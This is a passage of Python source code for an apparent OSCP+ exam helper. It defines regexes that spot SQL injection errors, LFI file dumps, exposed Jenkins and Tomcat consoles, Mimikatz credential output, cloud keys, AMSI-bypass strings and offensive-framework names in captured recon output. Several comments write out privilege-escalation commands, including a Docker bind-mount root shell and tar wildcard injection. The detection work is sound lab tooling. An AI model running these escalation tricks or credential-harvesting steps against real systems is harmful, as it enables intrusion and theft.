    r'(?im)^X-Generator\s*:\s*Drupal\s+(\d+(?:\.\d+)?)'
)
_DRUPAL_META = re.compile(
    r'(?i)<meta\s+name\s*=\s*[\'"]Generator[\'"]\s+content\s*=\s*'
    r'[\'"]Drupal\s+(\d+(?:\.\d+)?)'
)

# iter-240: SQL injection confirmed via captured database error
# messages OR union-based extraction output. Emit HIGH with a
# MANUAL UNION-based extraction template - sqlmap is NOT
# exam-legal per the OSCP+ ruleset, so the operator has to run
# the queries by hand.
_SQLI_MYSQL_ERR = re.compile(
    r'(?i)You\s+have\s+an\s+error\s+in\s+your\s+SQL\s+syntax|'
    r'Warning:\s+mysqli?_\w+\(\)|'
    r'MySqlException:|'
    r'valid\s+MySQL\s+result\s+resource'
)
_SQLI_MSSQL_ERR = re.compile(
    r'(?i)Unclosed\s+quotation\s+mark\s+after\s+the\s+character\s+string|'
    r'Microsoft\s+OLE\s+DB\s+Provider\s+for\s+(?:SQL\s+Server|ODBC)|'
    r'\[Microsoft\]\[ODBC\s+SQL\s+Server\s+Driver\]|'
    r'System\.Data\.SqlClient\.SqlException'
)
_SQLI_POSTGRES_ERR = re.compile(
    r'(?i)PG::SyntaxError:|'
    r'syntax\s+error\s+at\s+or\s+near\s+["\']|'
    r'ERROR:\s+syntax\s+error\s+at\s+or\s+near|'
    r'PSQLException:'
)
_SQLI_ORACLE_ERR = re.compile(
    r'(?i)ORA-\d{5}[^\r\n]{0,80}|'
    r'quoted\s+string\s+not\s+properly\s+terminated'
)
# iter-242 audit fix: prior alternation included `GROUP BY..HAVING`
# (matches legit aggregate SQL) and bare `information_schema.tables`
# (matches DB tutorials/pgAdmin dumps). Both classes of FP dropped.
# Kept only ATTACK-SPECIFIC shapes:
#   * `@@version` reflection in response context (real UNION payloads
#     often expose this)
#   * `CONCAT(0x...)` hex-encoded payload marker (unique to attack)
#   * `UNION SELECT` + `information_schema` in close proximity (both
#     required = SQLi UNION attack, either alone is legit).
_SQLI_UNION_OUTPUT = re.compile(
    r'(?i)(?:@@version\s*[|,]\s*|'
    r'CONCAT\s*\(\s*[\'"]?0x[0-9a-f]{4,}[\'"]?|'
    r'UNION\s+(?:ALL\s+)?SELECT[^\r\n]{0,300}?information_schema\.)'
)

# iter-239: LFI / path-traversal captured response - the operator
# has performed an LFI and captured the response body containing
# system-file content. Dispositive signals:
#   (A) /etc/passwd shape: `root:x:0:0:root:/root:/bin/bash` etc
#   (B) Windows boot.ini: `[boot loader]` + `default=multi(0)disk(0)`
#   (C) Windows Win.ini: `[fonts]` and `[extensions]` sections
# Filename gate: skip when file IS /etc/passwd (real system file
# from a forensic dump, not an LFI capture) and skip .conf files
# that legitimately contain these substrings.
_LFI_ETC_PASSWD = re.compile(
    # iter-242 audit fix: also match /etc/shadow-style rows where
    # the pw field is a crypt-format hash (`root:$6$salt$hash:...`).
    # Prior regex assumed only /etc/passwd shape (`root:x:...`).
    # Now the pw field is any non-colon chars up to 150.
    r'(?m)^root:[^:\r\n]{0,150}:0:0:[^:\r\n]{0,60}:/root:'
)
_LFI_BOOT_INI = re.compile(
    r'(?im)^\[boot\s+loader\][^\[]{0,500}?default=multi\(\d+\)disk\(\d+\)'
)
_LFI_WIN_INI = re.compile(
    r'(?im)^\[fonts\][^\[]{0,2000}?\[(?:extensions|mci extensions)\]'
)

# iter-238: PHP exposure signals.
#   (A) Captured phpinfo() page → HIGH RCE-recon (extremely
#       revealing: PHP version, loaded extensions, disable_functions,
#       session location, doc_root, install path).
#   (B) X-Powered-By: PHP/X.Y.Z header → HIGH with version-window CVE
#       hints.
#   (C) PHP source-code disclosure (captured `<?php ... ?>` in raw
#       HTTP response) = interpreter misconfig, direct source leak.
_PHPINFO_PAGE = re.compile(
    r'(?i)(?:<title>\s*phpinfo\(\)|'
    r'<h1[^>]*>\s*PHP\s+Version\s+\d+\.\d+\.\d+|'
    r'Loaded\s+Configuration\s+File.{0,50}?php\.ini)'
)
_PHPINFO_PHP_VERSION = re.compile(
    r'(?i)PHP\s+Version\s+(\d+\.\d+\.\d+)'
)
_PHP_XPB = re.compile(
    # iter-242 audit fix: `X-Powered-By: PHP/8.1` (two-component)
    # missed because prior required three components. Made 3rd
    # component optional. `_vtuple` already pads to (major, minor,
    # 0) so version-window math still works.
    r'(?im)^X-Powered-By\s*:\s*PHP/(\d+\.\d+(?:\.\d+)?)'
)
# Source leak - `<?php` in a captured HTTP body that shouldn't have
# executable code. Very narrow: `<?php\s+` on a line boundary (real
# response) NOT preceded by any script-tag prose context.
_PHP_SRC_LEAK = re.compile(
    r'(?m)^\s*<\?php\s+(?:\$|echo|include|require|declare|namespace)'
)

# iter-234: modern web-app version-banner CVE hints. Payload IOCs
# for Log4Shell/Spring4Shell/Confluence OGNL are already covered by
# per-line matchers; missing was the DEFENDER-side signal - captured
# version banner or dependency listing revealing a vulnerable build.
#
# Confluence: nmap prints `Atlassian Confluence X.Y.Z` or the login
# page HTML has `Confluence X.Y.Z` in the footer.
_CONFLUENCE_VERSION = re.compile(
    r'(?i)Atlassian\s+Confluence[^\r\n]{0,80}?(\d+\.\d+(?:\.\d+)?)'
)
# Jira: similar shape.
_JIRA_VERSION = re.compile(
    r'(?i)Atlassian\s+Jira[^\r\n]{0,80}?(\d+\.\d+(?:\.\d+)?)'
)
# Log4j: version in jar listing (from `find / -name log4j*`) or in
# a maven / gradle dependency dump.
_LOG4J_VERSION = re.compile(
    r'(?i)log4j[- ](?:core[- ])?(\d+\.\d+(?:\.\d+)?)'
)
# Spring: `X-Application-Context: appname:profile:port` header is a
# tell for Spring Boot; a captured Spring version banner is even
# stronger.
_SPRING_VERSION = re.compile(
    r'(?i)spring[- ]?(?:framework|boot)?[- ]?(\d+\.\d+\.\d+)'
)

# iter-232: DNS zone transfer captured output (dig / dnsrecon / host).
# Successful AXFR gives the operator a full internal-DNS listing:
# hostnames, IPs, SRV records pointing at every service (KDC, LDAP,
# smtp, etc). Highest-value pivot intel on any AD lab where the DC
# forgot to restrict AXFR.
#
# Signal (A): dig header `; <<>> DiG` combined with AXFR in the
# command line or the SOA response.
_DIG_HEADER = re.compile(
    r'(?i)^;\s*<<>>\s*DiG\s+[\d.]+[^\r\n]*<<>>[^\r\n]{0,200}\baxfr\b',
    re.MULTILINE
)
# Signal (B): captured A / CNAME record rows in the AXFR reply.
# Format: `<name>.\t<ttl>\tIN\tA\t<ip>` (bind style) OR from Windows
# DNS: `<name>.<domain>\tA\t<ip>`.
_DNS_A_RECORD_ROW = re.compile(
    # iter-237 audit fix: trailing `.` after name is BIND-style
    # convention; Windows dnscmd AXFR captures don't include it.
    # Made `.` optional so both `dc01.corp.local. IN A 10.0.0.1`
    # (bind) and `dc01.corp.local A 10.0.0.1` (windows dnscmd)
    # match. Also made `IN` optional for the same reason.
    r'(?im)^([\w.\-]{2,80})\.?\s+(?:\d+\s+)?(?:IN\s+)?'
    r'(A|AAAA|CNAME)\s+([\w.:\-]{3,80})'
)
_DNS_SRV_RECORD_ROW = re.compile(
    r'(?im)^(_[\w.\-]{2,80})\.?\s+(?:\d+\s+)?(?:IN\s+)?SRV\s+'
    r'\d+\s+\d+\s+(\d+)\s+([\w.\-]{2,80})'
)

# iter-229: Jenkins /script Groovy console exposure. Prior coverage
# handled the credentials.xml encrypted blob and $_JOB_PASSWORD env
# vars, but the LIVE Jenkins UI is the primary OSCP+ Jenkins path -
# either anon /script (misconfigured older Jenkins) OR default creds
# on `/manage` giving Groovy-console RCE.
#
# Signal A: `X-Jenkins:` HTTP response header - dispositive, only
# Jenkins servers emit this.
_JENKINS_HEADER = re.compile(
    r'(?i)^X-Jenkins(?:-Session)?\s*:\s*(\S+)',
    re.MULTILINE
)
# Signal B: nmap http-title `Dashboard [Jenkins]` or captured HTML
# `<title>Dashboard [Jenkins]</title>`.
_JENKINS_TITLE = re.compile(
    r'(?i)(?:http-title\s*:\s*|<title>)\s*Dashboard\s*\[Jenkins\]'
)
# Signal C: captured /script or /jenkins/script path reference.
_JENKINS_SCRIPT_PATH = re.compile(
    r'(?i)(?:(?:GET|POST|HEAD)\s+/|https?://[^/\r\n\s]{3,80}/)'
    r'(?:jenkins/)?script(?:/|\?|\s|$)'
)

# iter-228: Apache Tomcat web-manager exposure. Prior iter-213
# handled AJP:8009 (Ghostcat). This is the HTTP:8080/8443/9000
# side: /manager/html + /host-manager which accept HTTP Basic auth
# with default creds on countless lab boxes.
#
# Signal A: `Apache Tomcat/X.Y.Z` banner from nmap http-server-header
# script OR from raw `Server:` response header.
_TOMCAT_VERSION = re.compile(
    r'(?i)Apache[- ]Tomcat[/-](\d+(?:\.\d+){1,3})'
)
# Signal B: captured HTTP request or response referencing the
# manager path - either a curl attempt (`GET /manager/html`) or a
# 401 challenge from `WWW-Authenticate: Basic realm="Tomcat
# Manager Application"`.
_TOMCAT_MANAGER_401 = re.compile(
    r'(?i)WWW-Authenticate\s*:\s*Basic\s+realm\s*=\s*["\']?'
    r'(?:Tomcat\s+Manager\s+Application|Tomcat\s+Manager)["\']?'
)
_TOMCAT_MANAGER_PATH = re.compile(
    r'(?i)(?:(?:GET|POST|HEAD)\s+/|https?://[^/\r\n\s]{3,80}/)'
    r'(?:manager|host-manager)/(?:html|text|status)'
)

# iter-245: PowerShell Constrained Language Mode + AMSI status +
# offensive-framework IOCs from captured .ps1 files / PS transcripts.
#
# Signal A: `$ExecutionContext.SessionState.LanguageMode` output
# reveals CLM status. `ConstrainedLanguage` = restricted, needs
# bypass. `FullLanguage` = unrestricted (bypass unneeded).
_PS_CLM_STATE = re.compile(
    r'(?i)(?:LanguageMode\s*:?\s*|LanguageMode\s*=\s*|'
    r'\$ExecutionContext\.SessionState\.LanguageMode[^\r\n]{0,50}?\s*)'
    r'(ConstrainedLanguage|FullLanguage|RestrictedLanguage|NoLanguage)'
)
# Signal B: AMSI bypass patterns from captured .ps1 / transcript.
# Presence of these = AMSI-bypass attempt captured, so the
# operator's next AMSI-tickled command may still be blocked.
_PS_AMSI_BYPASS = re.compile(
    r'(?i)(?:'
    r'\[Ref\]\.Assembly\.GetType\s*\(\s*[\'"][^\'"]{20,80}Amsi[^\'"]{0,50}[\'"]\s*\)|'
    r'System\.Management\.Automation\.AmsiUtils|'
    r'AmsiScanBuffer|'
    r'amsiInitFailed|'
    r'\[System\.Runtime\.InteropServices\.Marshal\]::WriteInt32'
    r')'
)
# Signal C: known-BANNED offensive-framework strings. Detecting
# these in loot = red-team artifacts the operator MUST NOT rerun
# on the exam (they'd violate the framework ban). Emit INFO with
# an explicit compliance callout so the operator recognizes them.
_PS_FRAMEWORK_IOC = re.compile(
    r'(?i)\b(?:'
    r'Invoke-Empire|Empire\s+(?:C2|agent|stager)|Empire\.exe|'
    r'Covenant\s+(?:Grunt|C2)|GruntStager|'
    r'Nishang|Invoke-PowerShellTcp|Invoke-PsUACme|'
    r'PoshC2|Posh_C2|Get-PoshInfo|'
    r'PowerSploit|Invoke-DllInjection|Invoke-Shellcode|'
    r'Cobalt\s*Strike|beacon\.exe|artifact\.exe'
    r')\b'
)

# iter-244: AS-REP-eligible user extraction from captured ldapsearch
# LDIF text. JSON ldapdomaindump output is handled by the dedicated
# ingester; this catches raw `ldapsearch` text output shape:
#   dn: CN=alice,CN=Users,DC=corp,DC=local
#   sAMAccountName: alice
#   userAccountControl: 4260352
# The UAC value's DONT_REQ_PREAUTH bit (0x400000) = AS-REP-roastable.
# Kerberoastable via serviceprincipalname is also flagged.
_LDAP_USER_BLOCK = re.compile(
    # Intermediate lines must NOT start another `dn:` block - prevents
    # cross-user span where user A's sAMAccountName gets paired with
    # user B's userAccountControl. Negative-lookahead pattern from
    # iter-224 SMB anon-share fix.
    r'(?im)^dn:\s*CN=([^,\r\n]{1,60}),[^\r\n]{0,300}\r?\n'
    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
    r'sAMAccountName:\s+([\w.\-$]{1,60})\s*\r?\n'
    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
    r'userAccountControl:\s+(\d+)'
)
_LDAP_SPN_BLOCK = re.compile(
    r'(?im)^dn:\s*CN=[^,\r\n]{1,60},[^\r\n]{0,300}\r?\n'
    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
    r'sAMAccountName:\s+([\w.\-$]{1,60})\s*\r?\n'
    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
    r'servicePrincipalName:\s+([^\r\n]{5,200})'
)

# iter-227: LDAP anonymous bind confirmed via rootDSE dump. On AD
# labs the anonymous bind + rootDSE read gives:
#   * defaultNamingContext = DC=corp,DC=local        (target domain)
#   * dnsHostName          = DC01.corp.local          (DC FQDN)
#   * supportedLDAPVersion / supportedSASLMechanisms  (config intel)
# From there the operator can pivot to authenticated LDAP queries
# once a cred is found, or run unauth `impacket-lookupsid` +
# `windapsearch -u '' -p '' --dc-ip <ip>` for the SID enum.
_LDAP_NAMING_CTX = re.compile(
    r'(?im)^\|?\s*namingContexts?\s*:\s*(DC=[\w\-.=,]{1,200})'
)
_LDAP_DEFAULT_NC = re.compile(
    r'(?im)^\|?\s*defaultNamingContext\s*:\s*(DC=[\w\-.=,]{1,200})'
)
_LDAP_ROOTDSE_HOSTNAME = re.compile(
    r'(?im)^\|?\s*dnsHostName\s*:\s*([\w\-.]{1,120})'
)

# iter-226: VNC 5900 unauth + weak-auth intel from nmap NSE.
# Three tiers of severity based on the Security types row:
#   None (1)             → HIGH direct connect, no auth at all
#   VNC Authentication (2) → MEDIUM weak DES challenge crackable via
#                            vncauth crack utility
#   Ultra (17) / TLS (18) / VeNCrypt (19) → INFO baseline
_VNC_PORT_LINE = re.compile(
    r'(?im)^\s*5900/tcp\s+open\s+vnc'
)
# vnc-info NSE block:
#   | vnc-info:
#   |   Protocol version: 3.8
#   |   Security types:
#   |     None (1)
#   |     VNC Authentication (2)
_VNC_INFO_BLOCK = re.compile(
    r'(?is)\|\s*vnc-info\s*:\s*\r?\n'
    r'(?:\|\s*Protocol\s+version\s*:\s*(\d+\.\d+)\s*\r?\n)?'
    r'\|\s*Security\s+types\s*:\s*\r?\n'
    r'((?:\|(?:_|\s)*[^\r\n]+\r?\n){1,10})'
)
_VNC_SEC_NONE = re.compile(r'(?i)\bNone\s*\(1\)')
_VNC_SEC_VNCAUTH = re.compile(r'(?i)VNC\s+Authentication\s*\(2\)')

# iter-225: FTP anonymous login accepted (nmap `ftp-anon` NSE or
# captured `ftp` client output). Two shapes:
#   (A) `Anonymous FTP login allowed (FTP code 230)` from nmap
#   (B) `230 Login successful.` after `USER anonymous` in captured
#       ftp session output
# Both = confirmed anon access → direct read of the ftp root, often
# containing web.config / unattend.xml / backup archives / .kdbx.
_FTP_ANON_NMAP = re.compile(
    r'(?i)Anonymous\s+FTP\s+login\s+allowed(?:\s*\(FTP\s+code\s+230\))?'
)
# Captured ftp client output:
#   ftp> USER anonymous
#   331 Please specify the password.
#   ftp> PASS anonymous@
#   230 Login successful.
_FTP_ANON_LOGIN = re.compile(
    r'(?im)^(?:230\s+Login\s+(?:successful|OK)|'
    r'230\s+User\s+\w+\s+logged\s+in)'
)
# Weak `USER anonymous` alone doesn't confirm success; require it
# NEAR a 230 response line. Captured ftp CLIENT output doesn't show
# raw USER commands - it shows `Name (host:default): anonymous` -
# so also match that shape.
_FTP_ANON_ATTEMPT = re.compile(
    r'(?i)(?:USER\s+anonymous|Name\s*\([^)]{0,80}\)\s*:\s*anonymous|'
    r'\bLogin\s*:\s*anonymous\b|\bftp\s+-a\b)'
)

# iter-224: SMB null-session + guest-access + anon-share intel from
# nmap NSE / smbclient / enum4linux output. These are the classic
# unauth-SMB primitives that let the operator ENUMERATE the domain +
# read shares WITHOUT any credentials. All three are exam-legal
# because they use built-in unauth SMB dialects; the exam ban applies
# to relay (Responder/ntlmrelayx), not to null-session reads.
#
# Signal (A): captured null-session success from enum4linux or smb
# scanner. Common shapes:
#   [+] Server X allows sessions using username '', password ''
#   [+] Session (NULL) successful
#   [*] Successfully authenticated as anonymous
_SMB_NULL_SESSION = re.compile(
    r'(?i)(?:'
    r'session\s+\(?null\)?\s+successful|'
    r'allows?\s+sessions?\s+using\s+username\s+[\'"]{2},\s*password\s+[\'"]{2}|'
    r'anonymous\s+login\s+(?:accepted|succeeded|allowed)|'
    r'authenticated\s+as\s+anonymous'
    r')'
)
# Signal (B): nmap `smb-enum-shares` shows `account_used: guest` or
# empty account_used = guest/anon session accepted.
_SMB_GUEST_ACCOUNT = re.compile(
    # iter-231 audit fix: nmap smb-enum-shares prints the LITERAL
    # string `<blank>` for anonymous enumeration, plus `<empty>` on
    # some NSE versions. Empty-value case (just whitespace) also
    # occurs in older versions.
    r'(?im)^\|?\s*account_used\s*:\s*(guest|<blank>|<empty>|)\s*$'
)
# Signal (C): captured `Anonymous access: READ` (or WRITE) on a share
# OTHER than IPC$ - IPC$ is normally readable via null session, so
# hitting IPC$ is not intel-worthy; hitting ADMIN$ / C$ / a custom
# share IS.
_SMB_ANON_ACCESS = re.compile(
    r'(?im)\\\\[^\\]+\\([^\\\r\n:]+):[^\r\n]*\r?\n'
    # Intermediate continuation lines must NOT start with `\\` (that
    # would be another share header - the regex would otherwise span
    # across shares and attribute IPC$'s READ to whichever share
    # sits ABOVE it).
    r'(?:\|(?!\s*\\\\)[^\r\n]*\r?\n){0,4}'
    r'\|[_\s]*Anonymous\s+access\s*:\s*(READ(?:/WRITE)?|WRITE)'
)

# iter-223: SNMP v1/v2c intel. Three signals:
#   (A) `161/udp open snmp` in nmap output → MEDIUM baseline with
#       community-guess hint (`onesixtyone` + top-community wordlist).
#   (B) Captured snmpwalk output with `SNMPv2-MIB::sysDescr.0 = STRING:
#       <banner>` → HIGH confirmation the community works AND an OS
#       banner for BlueKeep / MS17-010 / kernel-CVE routing.
#   (C) onesixtyone output row `<host> [<community>] <banner>` →
#       HIGH with the actual community string surfaced.
_SNMP_PORT_LINE = re.compile(
    r'(?im)^\s*161/udp\s+open\s+snmp'
)
_SNMP_SYS_DESCR = re.compile(
    r'(?i)SNMPv2-MIB::sysDescr\.0\s*=\s*STRING:\s*([^\r\n]{5,300})'
)
_ONESIXTYONE_HIT = re.compile(
    r'(?im)^(\d{1,3}(?:\.\d{1,3}){3})\s+\[([\w.\-]{1,60})\]\s+'
    r'([^\r\n]{5,200})'
)

# iter-216: Docker socket exposure = direct root. Two shapes:
#   (A) `id` / `groups` output showing membership in `docker` group -
#       any member can bind-mount the host root into a container:
#       `docker run --rm -v /:/mnt alpine chroot /mnt sh` -> root.
#   (B) `ls -la /var/run/docker.sock` showing the socket exists with
#       group-writable perms - equivalent primitive.
_DOCKER_GROUP_ID = re.compile(
    r'(?im)^\s*uid=\d+\([\w\-.]+\)\s+gid=\d+\([\w\-.]+\)\s+'
    r'groups=[^\r\n]*?\b\d+\(docker\)'
)
# iter-222 audit fix: prior `_DOCKER_GROUP_GROUPS` was a dead-code
# pattern - defined but never referenced by any dispatcher. Replaced
# with a specific `groups` command output shape that matches BOTH:
#   $ groups                 → `user docker wheel`
#   $ groups alice           → `alice : alice docker sudo`
# Anchored on the `groups` command line so we don't FP on random
# `X : Y docker Z` prose.
_DOCKER_GROUPS_CMD = re.compile(
    r'(?im)^(?:\$\s+)?groups(?:\s+\S+)?\s*(?::\s*)?[^\r\n]*?\bdocker\b'
)
_DOCKER_SOCK_LS = re.compile(
    r'(?im)^s\S{9,10}\s+\d+\s+root\s+(?:root|docker)\s+\d+\s+'
    r'\S+\s+\S+\s+\S+\s+/var/run/docker\.sock'
)

# iter-216: wildcard-injection chain (root cron/script that does
# `tar cf X *` or `chown user:user *` in a user-writable dir). The
# canonical exploit: drop `--checkpoint=1` + `--checkpoint-action=
# exec=/tmp/pwn.sh` files (or `--reference=/root/.ssh/id_rsa` for
# chown) into the glob dir; when the root task runs, tar/chown
# interprets the filenames as CLI flags.
_WILDCARD_TAR = re.compile(
    # iter-222 audit fix: allow flags between the archive path and the
    # wildcard (`tar cf backup.tar -C /somedir *` is the most common
    # cron form). Prior regex required `\S+\s+\*` back-to-back so any
    # additional flags dropped the match.
    r'(?i)\btar\s+[-]?[cvfzjJx]+\s+\S+(?:\s+-\S+(?:\s+\S+)?)*\s+\*(?:\s|$)'
)
_WILDCARD_CHOWN = re.compile(
    r'(?i)\bchown\s+(?:-R\s+)?[\w:.\-]+\s+(?:/\S+/)?\*(?:\s|$)'
)
_WILDCARD_CHMOD = re.compile(
    r'(?i)\bchmod\s+(?:-R\s+)?[\w:.\-+=]+\s+(?:/\S+/)?\*(?:\s|$)'
)
_WILDCARD_RSYNC = re.compile(
    r'(?i)\brsync\s+[^\r\n]*?\s+\*(?:\s|$)'
)

# iter-214: RDP NLA-disabled + rdp-ntlm-info intel from nmap scripts.
# Two things worth surfacing:
#
# Signal A: `Standard RDP Security: SUCCESS` in rdp-enum-encryption
# output = NLA is NOT required. Means the server accepts pre-auth
# connects, which unlocks:
#   * BlueKeep CVE-2019-0708 on Windows 7/Server 2008/Server 2008 R2
#     without patch (rdp-vuln-ms12-020 is separate)
#   * Passwd spray with FOUND creds (exam-legal - not brute force)
#     via netexec `nxc rdp <host> -u <user> -p <pw>` (single try per
#     found cred; NOT hydra/ncrack/crowbar which are online brute
#     forcers)
#
# Signal B: `rdp-ntlm-info:` script output gives:
#   * NetBIOS_Domain_Name + DNS_Domain_Name = domain to target
#   * NetBIOS_Computer_Name + DNS_Computer_Name = host to pivot to
#   * Product_Version = OS version - 6.1.x=Win7/2008R2, 6.0.x=Vista/
#     2008, 5.1.x=XP → BlueKeep candidates
_RDP_ENUM_STANDARD = re.compile(
    r'(?i)Standard\s+RDP\s+Security\s*:\s*SUCCESS'
)

# Mimikatz sekurlsa::logonpasswords NTLM block. We bound the wildcard distance
# tightly to avoid catastrophic backtracking on big files; the real block has
# Username/Domain/NTLM within ~300 bytes of each other.
_MK_NTLM = re.compile(
    r'(?i)\*\s*Username\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
    r'\*\s*Domain\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
    r'\*\s*NTLM\s*:\s*([a-f0-9]{32})\b'
)
# Mimikatz wdigest cleartext password
_MK_WDIGEST = re.compile(
    r'(?i)wdigest\s*:[\s\S]{0,100}?'
    r'\*\s*Username\s*:\s*(\S{1,40})\s*\n[\s\S]{0,100}?'
    r'\*\s*Domain\s*:\s*(\S{1,40})\s*\n[\s\S]{0,100}?'
    r'\*\s*Password\s*:\s*(?!\(null\))([^\r\n]{3,80})'
)
# Mimikatz lsadump::sam block
_MK_SAM = re.compile(
    r'(?i)RID\s*:\s*[0-9a-f]+\s*\(\d+\)\s*\n[\s\S]{0,100}?'
    r'User\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
    r'(?:Hash\s+)?NTLM(?:\s+hash)?\s*[:=]\s*([a-f0-9]{32})\b'
)
# Mimikatz dpapi::cred typed block
_MK_DPAPI_CRED = re.compile(
    r'(?i)\*\*\*\s*CREDENTIAL\s*\*\*\*[\s\S]{0,400}?'
    r'TargetName\s*:\s*([^\r\n]{1,80})[\s\S]{0,400}?'
    r'UserName\s*:\s*(\S{1,80})[\s\S]{0,400}?'
    r'CredentialBlob\s*:\s*([^\r\n]{3,200})'
)
# Rubeus kerberoast: SamAccountName + $krb5tgs$ block
_RUBEUS_KERB = re.compile(
    r'(?i)SamAccountName\s*:\s*(\S{1,40})[\s\S]{0,300}?'
    r'(\$krb5tgs\$\d+\$\*?\S{20,})'
)
# PowerView Get-DomainUser block: samaccountname + serviceprincipalname
_PV_KERB = re.compile(
    r'(?i)samaccountname\s*:\s*(\S{1,40})[\s\S]{0,400}?'
    r'serviceprincipalname\s*:\s*(\S{4,120})'
)
# cmdkey /list typed block
_CMDKEY_LIST = re.compile(
    r'(?i)Target\s*:\s*Domain:target=([^\r\n]{3,80})[\s\S]{0,200}?'
    r'User\s*:\s*([^\r\n]{1,80})'
)
# Lazagne typed credential block - title, URL, User, Password
_LAZAGNE = re.compile(
    r'(?im)^\s*(?:URL|Login|Username)\s*:\s*(\S{3,80})\s*\n[\s\S]{0,200}?'
    r'(?:Password|Pwd|Pass)\s*:\s*([^\r\n]{3,80})'
)
# pspy / pspy64 timestamped process line:
#   2024/03/14 12:34:56 CMD: UID=0    PID=4242  | /bin/bash /opt/backup.sh secret-token
# Real value: surfaces root-owned cron tasks + their argv (often plaintext token/path).
_PSPY_LINE = re.compile(
    r'(?m)^\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2}\s+CMD:\s+UID=(\d+)\s+'
    r'PID=\d+\s*\|\s*(.{4,400})$'
)
# Docker registry config.json auths block (Docker for Linux/Windows, podman):
#   "auths": { "registry.example.com": { "auth": "<base64 user:pass>" } }
# iter-169: split into a context anchor + a per-entry pattern. The prior
# combined regex only matched the FIRST registry in a multi-registry
# config.json because the `"auths":{` prefix was inside the repeated pattern;
# finditer restarted past the first b64 without finding another `"auths":{`
# to satisfy the prefix. Now match each entry independently and gate on
# the presence of `"auths"` in the surrounding text.
_DOCKER_AUTH_CTX = re.compile(r'"auths"\s*:\s*\{')
_DOCKER_AUTH = re.compile(
    r'"([A-Za-z0-9._\-][A-Za-z0-9._\-:/]{2,79})"\s*:\s*\{[^{}]{0,300}?'
    r'"auth"\s*:\s*"([A-Za-z0-9+/=]{12,200})"',
    re.MULTILINE,
)
# AWS instance metadata service v1/v2 capture - IAM role JSON response
#   "AccessKeyId" : "ASIA...",  "SecretAccessKey" : "...", "Token" : "..."
# Real value: short-lived role creds harvested via SSRF; we surface all three.
_IMDS_BLOCK = re.compile(
    r'"AccessKeyId"\s*:\s*"(A(?:KIA|SIA)[A-Z0-9]{16,20})"[\s\S]{0,500}?'
    r'"SecretAccessKey"\s*:\s*"([A-Za-z0-9/+=]{30,60})"'
    r'(?:[\s\S]{0,500}?"Token"\s*:\s*"([A-Za-z0-9/+=]{40,})")?'
)
# PowerShell transcript header (Start-Transcript / auto-transcription on Win10+):
#   **********************
#   Windows PowerShell transcript start
#   Start time: 20240314120000
#   Username: DOMAIN\user
_PS_TRANSCRIPT = re.compile(
    r'\*{10,}\s*\n\s*Windows PowerShell transcript start\s*\n[\s\S]{0,400}?'
    r'Username\s*:\s*([^\r\n]{1,80})[\s\S]{0,400}?'
    r'(?:Machine|Configuration Name|Process ID)\s*:\s*([^\r\n]{1,80})'
)
# In a PS transcript / cleartext history, captured cmdline secrets (priv. creds):
#   ConvertTo-SecureString -String "ActualPlaintext" -AsPlainText -Force
_PS_CONVERT_SECRET = re.compile(
    r'(?i)ConvertTo-SecureString\s+(?:-String\s+)?["\']([^"\']{3,80})["\']\s+-AsPlainText'
)
# Burp Suite captured request: Authorization: Basic <base64>
_HTTP_AUTH_BASIC = re.compile(
    r'(?i)Authorization\s*:\s*Basic\s+([A-Za-z0-9+/]{8,}={0,2})'
)
# Captured Authorization: Bearer JWT (3 segments separated by '.')
_HTTP_AUTH_BEARER_JWT = re.compile(
    r'(?i)Authorization\s*:\s*Bearer\s+(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{6,})'
)
# iter-185: Authorization: Bearer <opaque-token> - non-JWT PAT / API-key
# formats. Common walkthrough shapes:
#   ghp_, gho_, ghu_, ghs_, ghr_ (GitHub PATs)
#   github_pat_ (fine-grained GitHub PAT)
#   glpat- (GitLab PAT)
#   sk-, sk-proj- (OpenAI)
#   xoxb-, xoxp-, xoxa-, xapp-, xoxs- (Slack)
#   ntn_ (Notion), pat_ (Airtable), sq0csp_, sq0atp_ (Square)
#   dop_v1_, doo_v1_ (DigitalOcean)
#   nvapi- (NVIDIA API), sgp_ (Sendgrid)
# Prefix + underscore/hyphen + charset ranges are all well-known & distinct
# from generic random strings, so this stays high-signal / low-FP.
_HTTP_AUTH_BEARER_OPAQUE = re.compile(
    r'(?i)Authorization\s*:\s*Bearer\s+('
    r'gh[pousr]_[A-Za-z0-9_]{16,}|'
    r'github_pat_[A-Za-z0-9_]{40,}|'
    r'glpat-[A-Za-z0-9_-]{16,}|'
    r'sk-(?:proj-)?[A-Za-z0-9_-]{20,}|'
    r'xox[bpasro]-[A-Za-z0-9-]{10,}|'
    r'xapp-\d+-[A-Za-z0-9-]{10,}|'
    r'ntn_[A-Za-z0-9]{20,}|'
    r'pat[A-Za-z0-9]{14,}|'
    r'sq0csp-[A-Za-z0-9_-]{20,}|'
    r'sq0atp-[A-Za-z0-9_-]{20,}|'
    r'doo?_v1_[A-Za-z0-9]{40,}|'
    r'nvapi-[A-Za-z0-9_-]{20,}|'
    r'SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
    r')'
)
# iter-185: X-Api-Key / Api-Key / apikey header. Common in modern REST APIs
# (curl, Postman JSON, Invoke-WebRequest -Headers). We accept several
# equivalent spellings and gate on the key value looking like a real token
# (>= 16 chars, mixed alnum + typical URL-safe punctuation). Rejects
# placeholders like `<your-api-key>` / `YOUR_API_KEY` at dispatch.
# The `["\']?\s*[:=]` sequence handles JSON `"X-Api-Key": "v"` and
# PowerShell `@{'X-Api-Key' = 'v'}` where a closing quote sits between the
# header name and the separator.
_HTTP_APIKEY_HEADER = re.compile(
    r'(?i)(?:^|["\s\'])(X-API[_-]?Key|Api[_-]?Key|apikey|X-Auth-Token|'
    r'X-Access-Token|X-Auth-Key)["\']?\s*[:=]\s*'
    r'["\']?([A-Za-z0-9][A-Za-z0-9_.+/=~-]{15,120})["\']?'
)
# Sherlock/Watson/wesng "Appears Vulnerable" missing-patch output block:
#   Title:       Win32k Elevation of Privilege
#   MSBulletin:  MS16-135
#   CVEID:       CVE-2016-7255
